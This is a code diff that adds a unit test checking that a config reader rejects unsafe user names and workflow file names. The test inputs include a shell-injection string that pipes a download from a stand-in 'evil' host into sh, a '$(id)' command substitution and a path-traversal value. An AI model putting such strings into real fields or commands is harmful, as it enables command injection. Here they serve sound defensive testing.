@@ -77,6 +77,25 @@ describe('readConfig', () => {
 		expect((await readConfig(dir)).ciWorkflow).toBeUndefined()
 	})
 
+	// #388: these reach shell text and API paths unescaped.
+	it('ignores an agentUser, humanUser or ciWorkflow that is not a login or workflow file', async () => {
+		const dir = newTmpDir()
+		const read = async (value: string) => {
+			fs.outputJsonSync(join(dir, '.repo-ai.json'), {
+				agentUser: value,
+				humanUser: value,
+				ciWorkflow: value,
+			})
+			const { agentUser, humanUser, ciWorkflow } = await readConfig(dir)
+			return { agentUser, humanUser, ciWorkflow }
+		}
+		for (const bad of ['x; curl evil | sh', '$(id)', '-bot', 'a b', 'bot[bot]', '../ci.yml']) {
+			expect(await read(bad)).toEqual({})
+		}
+		expect(await read('some-bot')).toEqual({ agentUser: 'some-bot', humanUser: 'some-bot' })
+		expect((await read('ci-2.yaml')).ciWorkflow).toBe('ci-2.yaml')
+	})
+
 	it('reads checkCommand, trimmed, and ignores one a prompt cannot quote (#361)', async () => {
 		const dir = newTmpDir()
 		const read = async (checkCommand: unknown) => {
